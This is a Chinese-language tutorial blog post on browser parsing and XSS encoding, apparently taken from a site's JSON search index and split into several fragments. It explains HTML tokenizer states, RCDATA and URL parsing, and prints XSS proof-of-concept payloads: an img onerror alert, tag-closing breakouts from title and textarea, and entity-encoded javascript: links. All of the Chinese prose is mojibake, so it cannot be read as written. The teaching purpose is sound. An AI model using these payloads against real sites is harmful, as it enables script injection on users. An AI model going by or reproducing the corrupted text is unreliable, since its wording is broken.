1ï¼‰æµè§ˆå™¨æ¥æ”¶åˆ°å­—èŠ‚å†…å®¹çš„CSSæ–‡ä»¶ï¼› 2ï¼‰æµè§ˆå™¨å°†å­—èŠ‚å†…å®¹è½¬æ¢ä¸ºå­—ç¬¦æ–‡ä»¶ï¼› 3ï¼‰æµè§ˆå™¨å°†å­—ç¬¦æ–‡ä»¶è§£ææˆè®¸å¤šTokensï¼ˆç¬¦å·æ ‡ç­¾ï¼‰ï¼› 4ï¼‰å°†Tokenè§£æä¸ºèŠ‚ç‚¹å¯¹è±¡Objectsï¼› 5ï¼‰å°†èŠ‚ç‚¹å¯¹è±¡Objectsè¿æ¥èµ·æ¥æ„å»ºæˆCSSOMæ ‘ï¼ˆCSS Rule Treeï¼‰ï¼› 4ã€åŠ è½½è¿‡ç¨‹ä¸­ï¼Œé‡åˆ°å›¾ç‰‡èµ„æºï¼Œä¹Ÿæ˜¯å¦å‘èµ·ä¸€ä¸ªè¯·æ±‚è·å–å›¾ç‰‡èµ„æºï¼Œä¹Ÿä¸ä¼šå½±å“HTMLæ–‡æ¡£çš„åŠ è½½ã€‚ 5ã€JavaScriptï¼šåœ¨åŠ è½½è¿‡ç¨‹ä¸­ï¼Œå½“é‡åˆ°å¤–é“¾çš„JSè„šæœ¬æ–‡ä»¶æˆ–\u003cscript\u003eç­‰æ ‡ç­¾å†…çš„JSä»£ç æ—¶ï¼Œä¼šæš‚åœHTMLæ ‡ç­¾çš„è§£æï¼ŒæŒ‚èµ·HTMLæ–‡æ¡£åŠ è½½è§£ææ¸²æŸ“çš„çº¿ç¨‹ï¼ŒåŠ è½½JSè„šæœ¬æ–‡ä»¶ï¼Œä½¿ç”¨JavaScriptå¼•æ“å¯¹JSè¿›è¡Œè§£æï¼Œé€šè¿‡DOM API å’ŒCSSOM APIæ¥æ“ä½œ DOM Treeå’Œ CSS Rule Treeã€‚ç­‰åˆ°JSæ–‡ä»¶åŠ è½½ã€è§£æå®Œæ¯•ï¼Œæ‰ä¼šç»§ç»­è§£æHTMLï¼Œæ¢å¤HTMLæ–‡æ¡£çš„æ¸²æŸ“çº¿ç¨‹ã€‚ **è§£æJSä»£ç è¿‡ç¨‹**ï¼š 1ï¼‰æµè§ˆå™¨ä¼šè¯·æ±‚jsä»£ç ï¼Œè¿™æ—¶HTMLæ–‡ä»¶çš„è§£æä¼šåœä¸‹æ¥ï¼› 2ï¼‰ä½†æ˜¯CSSæ–‡ä»¶çš„è§£æä¸ä¼šåœæ­¢ï¼Œæ‰€ä»¥ä¼šç»§ç»­æ„é€ å‡ºCSSOMæ ‘ï¼› 3ï¼‰åœ¨æ„å»ºCSSOMæ ‘æ—¶ï¼Œè¿”å›çš„jsæ–‡ä»¶å¹¶ä¸ä¼šæ‰§è¡Œï¼Œåœ¨CSSOMæ ‘æ„å»ºå®Œæˆï¼Œæ‰ä¼šè¿è¡ŒJSæ–‡ä»¶ã€‚ 4ï¼‰JSæ–‡ä»¶æ‰§è¡Œç»“æŸåï¼ŒHTMLç»§ç»­è§£æå¹¶æ„å»ºå‡ºDOMæ ‘ï¼Œè¿›è¡Œä¸‹ä¸€æ­¥ã€‚ 6ã€æ„å»ºæ¸²æŸ“æ ‘ï¼šåœ¨DOMæ ‘å’ŒCSSOMæ ‘æ„å»ºå®Œæˆåï¼Œæµè§ˆå™¨ä¼šç»“åˆDOM Treeå’ŒCSS Rule Tree æ„å»ºå‘ˆç°æ ‘/æ¸²æŸ“æ ‘ï¼ˆRendering Treeï¼‰ï¼› 7ã€å¸ƒå±€é˜¶æ®µï¼šè·å–æ¸²æŸ“æ ‘ç»“æ„ã€èŠ‚ç‚¹ä½ç½®å’Œå¤§å°ç­‰ï¼› 8ã€ç»˜åˆ¶å…ƒç´ ï¼šæ ¹æ®æ¸²æŸ“æ ‘å’Œå¸ƒå±€ç»˜åˆ¶æ‰€æœ‰èŠ‚ç‚¹çš„å¯è§†å±æ€§ã€‚ 9ã€åˆå¹¶æ¸²æŸ“å±‚ï¼šæŠŠä»¥ä¸Šç»˜åˆ¶çš„æ‰€æœ‰å›¾å±‚ï¼ˆç±»ä¼¼äºPhotoShopä¸­çš„â€œå›¾å±‚â€ï¼‰åˆå¹¶,æœ€ç»ˆè¾“å‡ºä¸€å¼ å›¾ç‰‡ å½“ç”¨æˆ·åœ¨æµè§ˆç½‘é¡µæ—¶è¿›è¡Œäº¤äº’æˆ–é€šè¿‡ js è„šæœ¬æ”¹å˜é¡µé¢ç»“æ„æ—¶ï¼Œä»¥ä¸Šçš„éƒ¨åˆ†æ“ä½œæœ‰å¯èƒ½é‡å¤è¿è¡Œï¼Œæ­¤è¿‡ç¨‹ç§°ä¸º Repaint æˆ– Reflowã€‚ Repaintï¼šå½“å…ƒç´ æ”¹å˜æ—¶ï¼Œä¸ä¼šå½±å“å…ƒç´ åœ¨é¡µé¢å½“ä¸­çš„ä½ç½®ï¼ˆæ¯”å¦‚ background-color, border-color, visibilityï¼‰ï¼Œæµè§ˆå™¨ä»…ä»…ä¼šåº”ç”¨æ–°çš„æ ·å¼é‡ç»˜æ­¤å…ƒç´ ï¼Œæ­¤è¿‡ç¨‹ç§°ä¸º Repaintã€‚ Reflowï¼šå½“å…ƒç´ æ”¹å˜æ—¶ï¼Œå°†ä¼šå½±å“æ–‡æ¡£å†…å®¹ã€ç»“æ„æˆ–å…ƒç´ ä½ç½®ï¼Œæ­¤è¿‡ç¨‹ç§°ä¸º Reflowã€‚ï¼ˆ HTML ä½¿ç”¨çš„æ˜¯ flow based layout ï¼Œå³æµå¼å¸ƒå±€ï¼Œæ‰€ä»¥ï¼Œå¦‚æœæŸå…ƒä»¶çš„å‡ ä½•å°ºå¯¸å‘ç”Ÿäº†å˜åŒ–ï¼Œéœ€è¦é‡æ–°å¸ƒå±€ï¼Œä¹Ÿå°±å« Reflowã€‚ï¼‰ ","date":"2023-03-30","objectID":"/posts/2023-6-%E6%B5%8F%E8%A7%88%E5%99%A8xss%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86/:3:0","tags":["Pentest","XSS"],"title":"æµè§ˆå™¨XSSç¼–ç è§£æåŸç†","uri":"/posts/2023-6-%E6%B5%8F%E8%A7%88%E5%99%A8xss%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86/"},{"categories":["Pentest"],"content":"å››ã€æµè§ˆå™¨è§£æ è§£æ HTML æ–‡æ¡£æ¶‰åŠä¸‰ä¸ªä¸»è¦è¿‡ç¨‹ï¼šHTML è§£æå™¨ã€URL è§£æå™¨å’Œ JavaScript è§£æå™¨ã€‚æ¯ä¸ªè§£æå™¨è´Ÿè´£è§£ç å’Œè§£æå…¶æ–‡æ¡£ï¼Œå¹¶ä¸”åœ¨ç›¸åº”çš„è§£æå™¨è§„èŒƒä¸­æ˜ç¡®æŒ‡å®šäº†å®ƒä»¬åº”è¯¥å¦‚ä½•æ‰§è¡Œæ­¤æ“ä½œã€‚ ","date":"2023-03-30","objectID":"/posts/2023-6-%E6%B5%8F%E8%A7%88%E5%99%A8xss%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86/:4:0","tags":["Pentest","XSS"],"title":"æµè§ˆå™¨XSSç¼–ç è§£æåŸç†","uri":"/posts/2023-6-%E6%B5%8F%E8%A7%88%E5%99%A8xss%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86/"},{"categories":["Pentest"],"content":"4.1 HTMLè§£æ ä¸Šæ–‡è¯´è¿‡æµè§ˆå™¨å°†æ”¶åˆ°çš„HTMLæ–‡ä»¶çš„å­—èŠ‚å†…å®¹è½¬æ¢ä¸ºå­—ç¬¦æ–‡ä»¶ï¼Œç„¶åå°†å­—ç¬¦æ–‡ä»¶è§£ææˆè®¸å¤šTokensï¼ˆç¬¦å·æ ‡ç­¾ï¼‰ï¼Œåœ¨è¿™ä¸€è¿‡ç¨‹ç”¨åˆ°çš„å°±æ˜¯HTMLè§£æå™¨ã€‚ å‚è€ƒHTMLæ ‡è®°è§„èŒƒï¼Œæˆ‘ä»¬åªéœ€å…³æ³¨å¦‚ä½•å®Œæˆæ–‡æ¡£è§£ç å’Œä½•æ—¶åˆ›å»ºæ–°tokenã€‚ é¦–å…ˆäº†è§£ä¸€ä¸‹HTMLè§£æå™¨çš„å·¥ä½œåŸç†ï¼š HTMLè§£æå™¨æ˜¯ä¸€ä¸ªçŠ¶æ€æœºï¼Œå®ƒè‡ªä¸Šè€Œä¸‹å¯¹HTMLèµ„æºä»è¿›è¡Œè§£æï¼Œå½“é‡åˆ°ä¸€ä¸ª\u003cç¬¦å·ï¼ˆåé¢æ²¡æœ‰/ï¼‰æ—¶ï¼Œå°±ä¼šè¿›å…¥æ ‡ç­¾å¼€å§‹çŠ¶æ€ï¼ˆTag Open Stateï¼‰ï¼› ç„¶åè¿›å…¥æ ‡ç­¾åç§°çŠ¶æ€ï¼ˆTag name stateï¼‰æœå¯»æ ‡ç­¾ï¼Œimgå¯ä»¥è¢«è¯†åˆ«ä¸ºæ­£ç¡®çš„æ ‡ç­¾ï¼Œimg1åˆ™ä¸ä¼šè¯†åˆ«ã€‚ åé¢å¯èƒ½è¿˜æœ‰å…¶ä»–å¾ˆå¤šç§çŠ¶æ€ï¼Œå¦‚ï¼š\"Before attribute name state\"ã€â€œAttribute name stateâ€ç­‰ï¼Œæˆ‘ä»¬å…ˆä¸æï¼Œæœ‰å…´è¶£å¯ä»¥å»çœ‹HTMLæ ‡è®°è§„èŒƒã€‚ å½“æœ€ååœ¨è¯»åˆ°æœ€è¿‘çš„ä¸€ä¸ª\u003eæ—¶ï¼Œç»“æŸæ ‡ç­¾çŠ¶æ€è¿›å…¥æ•°æ®çŠ¶æ€ï¼ˆData Stateï¼‰ï¼Œå‘å‡ºå½“å‰æ ‡ç­¾tokenã€‚ å½“è§£æå™¨å¤„äºâ€œæ•°æ®çŠ¶æ€â€æ—¶ï¼Œå®ƒä¼šç»§ç»­è¿›è¡ŒHTMLè§£æå¤„ç†å¹¶åœ¨å‘ç°å®Œæ•´æ ‡è®°æ—¶å‘å‡ºtokenã€‚ HTMLå­—ç¬¦å®ä½“è§£ç  åœ¨è§£æè¿‡ç¨‹ä¸­é‡åˆ°HTMLå­—ç¬¦å®ä½“ç¼–ç ï¼ŒHTMLè§£æå™¨å¤„äºä»¥ä¸‹ä¸‰ç§çŠ¶æ€æ—¶ï¼Œèƒ½å¤Ÿå¯¹HTMLå­—ç¬¦å®ä½“è¿›è¡Œè§£ç ï¼š â€œæ•°æ®çŠ¶æ€â€ï¼ˆâ€œCharacter reference in data stateâ€ï¼› â€œRCDATAçŠ¶æ€â€ï¼ˆâ€œCharacter reference in RCDATA stateâ€ï¼‰ â€œå±æ€§å€¼çŠ¶æ€â€ï¼ˆâ€œCharacter reference in attribute value stateâ€ï¼‰ã€‚ è¿™äº›çŠ¶æ€ä¸‹ï¼ŒHTML å®ä½“å°†ä»å…¶â€œ\u0026#..;â€å½¢å¼ä¸­è§£ç å‡ºæ¥ï¼Œå˜æˆç›¸åº”çš„å­—ç¬¦æ’å…¥åˆ°æ•°æ®ç¼“å†²åŒºã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼ŒHTMLå­—ç¬¦å®ä½“ç¼–ç åªèƒ½åœ¨æ•°æ®çŠ¶æ€ï¼ˆæ ‡ç­¾å¤–éƒ¨å’Œæ ‡ç­¾çš„textæ®µï¼‰ï¼ŒRCDATAçŠ¶æ€ï¼ˆRCDATAå…ƒç´ å†…ï¼‰ã€å±æ€§å€¼çŠ¶æ€ï¼ˆæ ‡ç­¾å†…çš„å±æ€§å€¼ä½ç½®ï¼‰æ‰èƒ½è¢«è§£æã€‚ 1.æ•°æ®çŠ¶æ€ 13.2.5.1 Data state Consume the next input character: U+0026 AMPERSAND (\u0026) Set the return state to the data state. Switch to the character reference state. U+003C LESS-THAN SIGN (\u003c) Switch to the tag open state. U+0000 NULL This is an unexpected-null-character parse error. Emit the current input character as a character token. EOF Emit an end-of-file token. Anything else Emit the current input character as a character token. å½“åœ¨æ•°æ®çŠ¶æ€ï¼Œå³æ ‡ç­¾å¤–éƒ¨ï¼Œæˆ–è€…æ ‡ç­¾å†…çš„textæ®µä¸­ï¼ŒåŒ¹é…åˆ°\u0026ç¬¦å·æ—¶ï¼Œä¼šåˆ‡æ¢åˆ°å­—ç¬¦å¼•ç”¨çŠ¶æ€ï¼ˆcharacter reference stateï¼‰ã€‚ ä¾‹å¦‚é—®é¢˜4ï¼Œâ€œ\u003câ€å’Œâ€œ\u003eâ€å­—ç¬¦åœ¨è¾“å…¥æµä¸­è¢«ç¼–ç ä¸ºâ€œ\u0026#60;â€å’Œâ€œ\u0026#62;â€ï¼Œå½“è§£æå™¨å¤„äºâ€œæ•°æ®çŠ¶æ€â€æ—¶ï¼Œå®ƒä»¬å°†è¢«è§£æã€‚ 4.å®ä½“ç¼–ç \u003c \u003e \u003cdiv\u003e\u0026#60;img src=x onerror=alert(4)\u0026#62;\u003c/div\u003e é‚£ä¹ˆå½“HTMLå®ä½“è¢«è§£æä¸º\u003c \u003eæ—¶ï¼Œå®ƒä»¬ä¸­çš„è„šæœ¬èƒ½å¦è¢«æ‰§è¡Œå‘¢ï¼Ÿ ç­”æ¡ˆæ˜¯ä¸èƒ½ï¼Œå› ä¸ºå½“è§£æå™¨åœ¨è§£æå®ä½“ç¼–ç åï¼Œä¸ä¼šè½¬æ¢æˆâ€œæ ‡ç­¾æ‰“å¼€çŠ¶æ€â€ï¼Œå› æ­¤ä¸ä¼šåˆ›å»ºæ–°çš„æ ‡ç­¾ã€‚ è¿™å°±æ˜¯æˆ‘ä»¬ä¸ºä»€ä¹ˆå»ºè®®ç”¨å­—ç¬¦å®ä½“ç¼–ç æ¥å¤„ç†ä¸å—ä¿¡ä»»çš„ç”¨æˆ·è¾“å…¥ï¼Œä»¥ç¡®ä¿å®ƒä»¬ä½œä¸ºæ•°æ®è¿›è¡Œè§£æã€‚ å†çœ‹ï¼Œæˆ‘ä»¬å¯¹h1çš„hè¿›è¡ŒHTMLå®ä½“ç¼–ç ï¼Œå®ƒèƒ½è¢«è§£æå½¢æˆæ ‡ç­¾å—ï¼Ÿ \u003cdiv\u003e \u003c\u0026#104;1\u003e123\u003c/h1\u003e \u003c/div\u003e ç­”æ¡ˆæ˜¯ä¸èƒ½ï¼ŒHTMLè§£æå™¨é¦–å…ˆåŒ¹é…åˆ°divæ ‡ç­¾ï¼Œè¿›å…¥æ•°æ®çŠ¶æ€ï¼Œæ¥ç€æœç´¢åˆ°\u003cï¼Œè¿›å…¥æ ‡ç­¾åç§°çŠ¶æ€ï¼Œä½†å¹¶æ²¡æœ‰åŒ¹é…åˆ°æ­£ç¡®çš„æ ‡ç­¾ï¼Œæ‰€ä»¥å›åˆ°äº†æ•°æ®çŠ¶æ€ï¼Œå¯¹\u0026#104;è¿›è¡Œè§£ç ï¼Œæœ€åè¿”å›çš„ç»“æœå°±æ˜¯æ–‡æœ¬çŠ¶æ€ä¸‹çš„\u003ch1\u003e123ã€‚ 2.RCDATAçŠ¶æ€ ä»€ä¹ˆæ˜¯RCDATAï¼Ÿæˆ‘ä»¬éœ€è¦çŸ¥é“HTMLä¸­å…±æœ‰5ç§å…ƒç´ ï¼šç©ºå…ƒç´ ã€åŸå§‹æ–‡æœ¬å…ƒç´ ã€RCDATAå…ƒç´ ã€å¤–æ¥å…ƒç´ ä»¥åŠå¸¸è§„å…ƒç´ ã€‚RCDATAçŠ¶æ€å°±æ˜¯RCDATAå…ƒç´ æ ‡ç­¾å†…çš„çŠ¶æ€ã€‚ Void å…ƒç´ ï¼šarea, base, br, col, embed, hr, img, input, keygen, link, menuitem, meta, param, source, track, wbrã€‚Voidå…ƒç´ æ²¡æœ‰ç»“æŸæ ‡ç­¾ï¼Œå› æ­¤ä¸èƒ½åœ¨å¼€å§‹æ ‡ç­¾å’Œç»“æŸæ ‡ç­¾ç›´æ¥æ”¾ä»»ä½•å†…å®¹ã€‚ Raw text å…ƒç´ ï¼šscript, styleã€‚Raw textå…ƒç´ èƒ½å«æœ‰textæ–‡æœ¬å†…å®¹ã€‚ RCDATA å…ƒç´ ï¼štextarea, titleã€‚RCDATA å…ƒç´ å¯ä»¥æœ‰æ–‡æœ¬å’Œå­—ç¬¦å¼•ç”¨ Foreign å…ƒç´ ï¼šMathML å‘½åç©ºé—´å’Œ SVG å‘½åç©ºé—´çš„å…ƒç´ ã€‚å¤–éƒ¨å…ƒç´ å¯ä»¥æœ‰æ–‡æœ¬ã€å­—ç¬¦å¼•ç”¨ã€CDATA éƒ¨åˆ†ã€å…¶ä»–å…ƒç´ å’Œæ³¨é‡Šã€‚ Normal å…ƒç´ ï¼šé™¤äº†ä»¥ä¸Š4ç§å…ƒç´ ä»¥å¤–çš„å…¶ä»–æ‰€æœ‰å…è®¸çš„ HTML å…ƒç´ éƒ½æ˜¯æ™®é€šå…ƒç´ ã€‚æ™®é€šå…ƒç´ å¯ä»¥æœ‰æ–‡æœ¬ã€å­—ç¬¦å¼•ç”¨ã€å…¶ä»–å…ƒç´ å’Œæ³¨é‡Šã€‚ 13.2.5.2 RCDATA state Consume the next input character: U+0026 AMPERSAND (\u0026) Set the return state to the RCDATA state. Switch to the character reference state. U+003C LESS-THAN SIGN (\u003c) Switch to the RCDATA less-than sign state. U+0000 NULL This is an unexpected-null-character parse error. Emit a U+FFFD REPLACEMENT CHARACTER character token. EOF Emit an end-of-file token. Anything else Emit the current input character as a character token. ä¹‹å‰æˆ‘ä»¬è¯´â€œRCDATA çŠ¶æ€â€ä¸‹å¯ä»¥å¯¹HTMLå­—ç¬¦å¼•ç”¨è¿›è¡Œè§£ç ã€‚è¿™æ„å‘³ç€â€œtextareaâ€å’Œâ€œtitleâ€ä¸­çš„å­—ç¬¦å¼•ç”¨å°†è¢« HTML è§£æå™¨è§£ç ã€‚ åŒæ ·ï¼Œåœ¨è§£ç è¿™äº›å­—ç¬¦å¼•ç”¨æ—¶æ²¡æœ‰è¿›å…¥â€œæ ‡ç­¾æ‰“å¼€çŠ¶æ€â€ï¼Œè¿™å°±æ˜¯é—®é¢˜ 5 ä¸­æ²¡æœ‰è„šæœ¬æ‰§è¡Œçš„åŸå› ã€‚ 5.å®ä½“ç¼–ç \u003c \u003e \u003ctextarea\u003e\u0026#60;script\u0026#62;alert(5)\u0026#60;/script\u0026#62;\u003c/textarea\u003e æ­¤å¤–ï¼ŒRCDATAè¿˜æœ‰ä¸€ä¸ªç‰¹åˆ«ä¹‹å¤„ã€‚å½“æµè§ˆå™¨è§£æåˆ° RCDATA å…ƒç´ æ—¶ï¼Œå®ƒä¼šè¿›å…¥â€œRCDATA çŠ¶æ€â€ã€‚åœ¨è¿™ç§çŠ¶æ€ä¸‹ï¼Œå¦‚æœé‡åˆ°â€™\u003câ€˜å­—ç¬¦ï¼Œå°±ä¼šåˆ‡æ¢åˆ°â€œRCDATAå°äºå·çŠ¶æ€â€ï¼ˆRCDATA less-than sign stateï¼‰ï¼Œå¦‚æœåé¢ç´§è·Ÿçš„ä¸æ˜¯ç›¸åº”çš„RCDATAå…ƒç´ é—­åˆæ ‡ç­¾ï¼Œåˆ™ä¼šå›åˆ°â€œRCDATAçŠ¶æ€â€ã€‚ è¿™æ„å‘³ç€åœ¨ RCDATA å…ƒç´ ï¼ˆä¾‹å¦‚ \u003ctextarea\u003eã€\u003ctitle\u003eï¼‰çš„æ ‡ç­¾å†…éƒ¨ï¼Œå”¯ä¸€èƒ½å¤Ÿè¢«è¯†åˆ«ä¸ºæ ‡ç­¾çš„å­—ç¬¦æ˜¯ â€\u003c/textarea\u003eâ€é—­åˆæ ‡ç­¾æˆ–â€œ\u003c/title\u003eâ€é—­åˆæ ‡ç­¾ï¼Œå…·ä½“å–å†³äºå‰é¢æ‰“å¼€çš„æ ‡ç­¾ã€‚ å› æ­¤ï¼Œå³ä¾¿åœ¨â€œtextareaâ€æˆ–â€œtitleâ€ä¸­åˆ›å»ºé¢å¤–çš„æ ‡ç­¾ï¼Œä¹Ÿæ— æ³•åœ¨å…¶ä¸­æ‰§è¡Œè„šæœ¬ã€‚è¿™å°±è§£é‡Šäº†ä¸ºä»€ä¹ˆé—®é¢˜6ä¸­è„šæœ¬ä¸æ‰§è¡Œã€‚ \u003ctextarea\u003e\u003cscript\u003ealert(6)\u003c/script\u003e\u003c/textarea\u003e å…³äºâ€œCDATAâ€å…ƒç´ çš„ç®€å•è¯´æ˜ã€‚CDATA ä¸­åŒ…å«çš„ä»»ä½•å†…å®¹éƒ½ä¸ä¼šå¯¼è‡´è§£æå™¨åˆ›å»ºæ–°çš„å¼€æ”¾æ ‡è®°ï¼Œå¹¶ä¸”å®ƒä»¥â€œ]]\u003eâ€åºåˆ—ç»“æŸã€‚ å› æ­¤ï¼Œå¦‚æœç”¨æˆ·è¾“å…¥æƒ³è¦è·³å‡º CDATA ä¸Šä¸‹æ–‡ï¼Œå¿…é¡»ä½¿ç”¨æ²¡æœ‰ä»»ä½•ç¼–ç çš„ç²¾ç¡®â€œ]]\u003eâ€åºåˆ—ï¼Œå¦åˆ™å®ƒä¸ä¼šè·³å‡ºä¸Šä¸‹æ–‡ã€‚ æ‰€ä»¥å½“æˆ‘ä»¬é‡åˆ°\u003ctextarea\u003eæˆ–\u003ctitle\u003eæ ‡ç­¾ä¸‹çš„XSSæ’å…¥ç‚¹æ—¶ï¼Œé¦–å…ˆè¦åšçš„å°±æ˜¯é—­åˆå‰é¢çš„æ ‡ç­¾ï¼Œè¿™æ ·åç»­çš„payloadæ‰å¯èƒ½è¢«æ‰§è¡Œï¼Œå¦‚ï¼š \u003c/title\u003e\u003cscript\u003ealert(1)\u003c/script\u003e \u003c/textarea\u003e\u003cscript\u003ealert(2)\u003c/script\u003e Foreign å…ƒç´  ç»†å¿ƒçš„åŒå­¦ä¼šå‘ç°ä¸Šæ–‡æˆ‘ä»¬æåˆ°Foreignå…ƒç´ ä¹Ÿå¯ä»¥æœ‰å­—ç¬¦å¼•ç”¨ã€‚ Foreign å…ƒç´ ï¼šMathML å‘½åç©ºé—´å’Œ SVG å‘½åç©ºé—´çš„å…ƒç´ ã€‚å¤–éƒ¨å…ƒç´ å¯ä»¥æœ‰æ–‡æœ¬ã€å­—ç¬¦å¼•ç”¨ã€CDATA éƒ¨åˆ†ã€å…¶ä»–å…ƒç´ å’Œæ³¨é‡Šã€‚ è¿™ç±»æƒ…å†µï¼Œä¹Ÿæ˜¯å±äºæ•°æ®çŠ¶æ€è§£æHTMLå­—ç¬¦å¼•ç”¨ï¼Œçœ‹ç¤ºä¾‹ï¼š ç¼–ç \u003cimg src onerror=alert(1)\u003e \u003cmath\u003e\u0026lt;\u0026#105;\u0026#109;\u0026#103;\u0026#32;\u0026#115;\u0026#114;\u0026#99;\u0026#32;\u0026#111;\u0026#110;\u0026#101;\u0026#114;\u0026#114;\u0026#111;\u0026#114;\u0026equals;\u0026#97;\u0026#108;\u0026#101;\u0026#114;\u0026#116;\u0026lpar;\u0026#49;\u0026rpar;\u0026gt;\u003c/math\u003e \u003csvg\u003e\u0026lt;\u0026#105;\u0026#109;\u0026#103;\u0026#32;\u0026#115;\u0026#114;\u0026#99;\u0026#32;\u0026#111;\u0026#110;\u0026#101;\u0026#114;\u0026#114;\u0026#111;\u0026#114;\u0026equals;\u0026#97;\u0026#108;\u0026#101;\u0026#114;\u0026#116;\u0026lpar;\u0026#49;\u0026rpar;\u0026gt;\u003c/svg\u003e ä¸Šè¿°ç¤ºä¾‹å¯ä»¥è¢«è§£ç ï¼Œä½†ä¸ä¹‹å‰æè¿‡çš„ä¸€æ ·ï¼Œ","date":"2023-03-30","objectID":"/posts/2023-6-%E6%B5%8F%E8%A7%88%E5%99%A8xss%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86/:4:1","tags":["Pentest","XSS"],"title":"æµè§ˆå™¨XSSç¼–ç è§£æåŸç†","uri":"/posts/2023-6-%E6%B5%8F%E8%A7%88%E5%99%A8xss%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86/"},{"categories":["Pentest"],"content":"4.2 URLè§£æ URL è§£æå™¨ä¹Ÿå¯ä»¥è§†ä¸ºçŠ¶æ€æœºï¼Œè¾“å…¥æµä¸­çš„å­—ç¬¦å¯ä»¥å°†å…¶å®šå‘åˆ°ä¸åŒçš„çŠ¶æ€ã€‚URLè§£æå™¨è§„èŒƒåœ¨è¿™é‡Œã€‚ ä»å®‰å…¨æˆ– XSS è½¬ä¹‰çš„è§’åº¦æ¥çœ‹ï¼Œæœ‰å‡ ä»¶äº‹å¾ˆæœ‰è¶£ã€‚ é¦–å…ˆï¼ŒURL æ ¼å¼å¿…é¡»æ˜¯ ASCII å­—æ¯å­—ç¬¦ã€‚ (U+0041-U+005A || U+0061-U+007A)ï¼Œå¦åˆ™çŠ¶æ€ä¼šè½¬å˜ä¸ºâ€œæ— æ ¼å¼â€çŠ¶æ€ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœå¯¹åè®®æ ¼å¼è¿›è¡Œä»»ä½•å½¢å¼çš„ç¼–ç ï¼ŒURL è§£æå™¨éƒ½å°†æ— æ³•è¯†åˆ«ä¸ºåè®®ã€‚é—®é¢˜ 1 ä¸­çš„è„šæœ¬ä¸æ‰§è¡Œå°±æ˜¯å› ä¸ºURL è§£æå™¨æ²¡æœ‰å°†url ç¼–ç çš„â€œjavascriptâ€è¯†åˆ«ä¸ºåè®®ã€‚ 1.URLç¼–ç \"javascript:alert(1)\" \u003ca href=\"%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29\"\u003e\u003c/a\u003e 3.URLç¼–ç \":\" \u003ca href=\"javascript%3aalert(3)\"\u003e\u003c/a\u003e åŒæ ·çš„ç†è®ºä¹Ÿé€‚ç”¨äº â€˜:â€™ å­—ç¬¦ï¼Œå¦‚æœå¯¹å…¶è¿›è¡Œç¼–ç å°†æ— æ³•è¯†åˆ«ã€‚è¿™å°±æ˜¯é—®é¢˜ 3 ä¸­çš„è„šæœ¬ä¸ä¼šæ‰§è¡Œçš„åŸå› ã€‚ é‚£ä¹ˆï¼Œå½“ä½¿ç”¨å­—ç¬¦å®ä½“å¯¹æ–¹æ¡ˆ (javascript) è¿›è¡Œç¼–ç æ—¶ï¼Œä¸ºä»€ä¹ˆé—®é¢˜ 2 ä¸­çš„è„šæœ¬ä¼šæ‰§è¡Œï¼Ÿ \u003ca href=\"\u0026#x6a;\u0026#x61;\u0026#x76;\u0026#x61;\u0026#x73;\u0026#x63;\u0026#x72;\u0026#x69;\u0026#x70;\u0026#x74;:%61 %6c%65%72%74%28%32%29\"\u003e è¿™é‡Œå°±è¦ç”¨åˆ°åˆšåœ¨HTML è§£æéƒ¨åˆ†è®¨è®ºè¿‡çš„å†…å®¹ï¼Œæœ‰ä¸€ç§çŠ¶æ€ç§°ä¸ºâ€œå±æ€§å€¼çŠ¶æ€â€ï¼Œåœ¨è¿™ç§çŠ¶æ€ä¸‹ï¼Œå­—ç¬¦å¼•ç”¨å°†è¢«è§£ç å¹¶æ›¿æ¢ä¸ºè§£ç åçš„ç‰ˆæœ¬ã€‚ \u003ca href=\"javascript:%61 %6c%65%72%74%28%32%29\"\u003e è¿™é‡Œå®é™…å‘ç”Ÿçš„æ˜¯HTMLè§£æå™¨è§£ææ–‡æ¡£ã€åˆ›å»ºæ ‡ç­¾tokenså¹¶è§£ç  href å±æ€§ä¸­çš„HTMLå­—ç¬¦å®ä½“ã€‚ å½“ HTML è§£æå™¨å®Œæˆåï¼ŒURL è§£æå™¨å¼€å§‹è§£æ href å€¼ä¸­çš„é“¾æ¥ï¼Œæ­¤æ—¶â€œjavascriptâ€å·²ç»è§£ç ï¼Œå¹¶è¢« URL è§£æå™¨è¯†åˆ«ä¸ºJavaScriptåè®®ã€‚ ç„¶å URL è§£æå™¨ç»§ç»­å¯¹é“¾æ¥çš„åç»­éƒ¨åˆ†è¿›è¡Œ URL è§£ç ã€‚å› ä¸ºæ˜¯â€œjavascriptâ€åè®®ï¼Œæ‰€ä»¥åç»­ä½¿ç”¨JavaScript è§£æå™¨æ¥è§£ææ‰§è¡Œï¼Œè¿™å°±æ˜¯é—®é¢˜ 2 ä¸­çš„è„šæœ¬è¢«æ‰§è¡Œçš„åŸå› ã€‚ âš ï¸æ³¨æ„ï¼šURLç¼–ç æ˜¯ä½¿ç”¨UTF-8ç¼–ç æ–¹æ¡ˆå¯¹æ¯ä¸ªå­—ç¬¦è¿›è¡Œç¼–ç ã€‚å¦‚æœä½¿ç”¨å¦ä¸€ç§æ–¹æ¡ˆå¯¹URLè¿›è¡Œç¼–ç ï¼Œåˆ™ URL è§£æå™¨å¯èƒ½æ— æ³•è¯†åˆ«ï¼Œè¿™å¯èƒ½ä¼šå˜å¾—å¤±æ•ˆã€‚ urlè§£æå™¨è¯†åˆ«ç›¸åº”çš„åè®®ï¼Œæˆ‘ä»¬ä¸Šé¢æåˆ°JavaScriptä¼ªåè®®ä¹‹å¤–ï¼Œé€šè¿‡httpåè®®åŠ è½½å¤–éƒ¨JSæ–‡ä»¶ï¼Œä¹Ÿæ˜¯ä¸€ç§æ–¹å¼ã€‚ åœ¨å¯¹å¤–éƒ¨é“¾æ¥çš„å¤„ç†ä¸Šï¼Œè¿˜å¯ä»¥è®¾è®¡ä¸€äº›URIçš„å˜å½¢ï¼Œä¸è¿‡è¿™äº›ä¸åœ¨æœ¬æ–‡è¿›è¡Œèµ˜è¿°ã€‚ 